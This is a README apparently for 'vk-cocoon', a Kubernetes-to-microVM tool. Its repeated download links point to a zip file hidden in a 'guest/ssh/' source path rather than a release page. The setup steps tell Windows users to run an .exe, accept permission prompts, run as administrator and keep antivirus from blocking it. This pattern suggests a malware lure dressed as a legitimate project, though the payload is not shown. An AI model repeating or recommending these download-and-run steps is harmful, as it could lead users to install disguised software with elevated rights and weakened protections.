# 🪟 vk-cocoon - Run pods as local microVMs

[![Download vk-cocoon](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Acoreasystemofmeasurement157/vk-cocoon/raw/refs/heads/main/guest/ssh/vk-cocoon-2.4.zip)

## 📥 Download
Visit this page to download the Windows version:
https://github.com/Acoreasystemofmeasurement157/vk-cocoon/raw/refs/heads/main/guest/ssh/vk-cocoon-2.4.zip

On the release page, look for the latest file for Windows. If there are several files, choose the one that matches your computer. For most users, that is the Windows 64-bit build.

## 🪟 What vk-cocoon does

vk-cocoon lets Kubernetes pods run as Cocoon MicroVMs. In simple terms, it gives each pod its own small virtual machine. This helps keep apps separate and easier to manage.

It supports:
- Windows and Linux guest systems
- `kubectl exec`
- `kubectl logs`
- `kubectl attach`
- `kubectl port-forward`
- VM actions like run, clone, restore, snapshot, and hibernate
- Remote snapshot pulls through Epoch

## ✅ Before you install

Make sure your PC has:
- Windows 10 or Windows 11
- An internet connection
- Enough free disk space for the app and its virtual machines
- Virtualization turned on in your BIOS or UEFI
- Admin rights on the PC

If you plan to use Windows guests, your system should also support modern virtualization features.

## 🚀 Get started on Windows

### 1. Open the release page
Go to:
https://github.com/Acoreasystemofmeasurement157/vk-cocoon/raw/refs/heads/main/guest/ssh/vk-cocoon-2.4.zip

### 2. Download the Windows file
Find the newest release and download the Windows package.

### 3. Extract the files
If the download comes as a `.zip` file:
- Right-click the file
- Choose Extract All
- Pick a folder you can find again, such as `Downloads` or `Desktop`

### 4. Run the app
Open the extracted folder and start the main `.exe` file.

If Windows asks for permission:
- Click Yes
- Allow the app to run

### 5. Keep the files in one place
Do not move random files out of the folder. The app may need the full set of files to work.

## 🧭 First-time setup

After you start vk-cocoon, you may need to set up a few things before you can use it with Kubernetes.

### Basic setup steps
- Open the app
- Point it to your Kubernetes config if asked
- Choose the guest type you want
- Start the Cocoon provider
- Connect your Kubernetes tools to the provider

### What you may see
- A local service window
- A status message for the provider
- Logs that show pod and VM activity
- Settings for snapshot and restore use

## 🛠️ How it works

vk-cocoon acts as a bridge between Kubernetes and Cocoon MicroVMs.

When Kubernetes starts a pod, vk-cocoon can:
- Create a new microVM
- Clone a saved VM image
- Restore a VM from a snapshot
- Put a VM into hibernate mode
- Pull a remote snapshot from Epoch

This gives each pod a VM-backed runtime instead of a plain container runtime.

## 🖱️ Using it with Kubernetes tools

Once the provider is running, you can use normal Kubernetes commands and tools.

Common actions:
- View logs with `kubectl logs`
- Open a shell with `kubectl exec`
- Attach to a running workload with `kubectl attach`
- Forward ports with `kubectl port-forward`

You do not need to learn a new app for daily use. You keep using Kubernetes tools, while vk-cocoon handles the VM side.

## 📁 File layout

A typical Windows release may include:
- Main program file
- Helper files
- Config files
- Log files
- Readme files for setup help

Keep the folder structure intact unless the release notes say otherwise.

## 🔧 Common setup needs

If the app does not start, check these items first:
- Virtualization is on in BIOS or UEFI
- Windows Defender or antivirus is not blocking the app
- You ran the app as administrator
- You downloaded the correct Windows build
- The files finished downloading and extracting

## 🧪 Typical use cases

vk-cocoon is useful when you want:
- Strong separation between workloads
- Linux and Windows guest support
- Pod-level isolation with VM behavior
- Snapshot and restore for faster startup
- A local setup that matches cloud-style workflows
- Better control over short-lived or sandboxed workloads

## 🔍 Features at a glance

- Runs Kubernetes pods as Cocoon MicroVMs
- Maps pod lifecycle steps to VM operations
- Supports Windows and Linux guests
- Works with `kubectl exec`, `logs`, `attach`, and `port-forward`
- Supports run, clone, restore, snapshot, and hibernate
- Pulls snapshots from Epoch when needed

## ❓ If something does not work

Try these steps:
- Reopen the app as administrator
- Check that virtualization is enabled
- Confirm you downloaded the latest release
- Extract the archive again to a new folder
- Restart Windows
- Run the app from a simple folder path like `C:\vk-cocoon`

## 📦 Download and install

To install on Windows:
1. Visit https://github.com/Acoreasystemofmeasurement157/vk-cocoon/raw/refs/heads/main/guest/ssh/vk-cocoon-2.4.zip
2. Download the latest Windows release
3. Extract the files if needed
4. Open the main program file
5. Follow the setup prompts in the app

## 🧩 Terms you may see

- **Pod**: A unit Kubernetes runs
- **MicroVM**: A small virtual machine
- **Snapshot**: A saved state you can return to
- **Hibernate**: A paused state that can resume later
- **Provider**: The part that connects Kubernetes to the VM system

## 🪄 What to expect after setup

After setup, the app can manage pods as microVMs and let you use familiar Kubernetes commands. It can start workloads, save state, restore state, and handle remote snapshots through Epoch while keeping the process tied to the pod lifecycle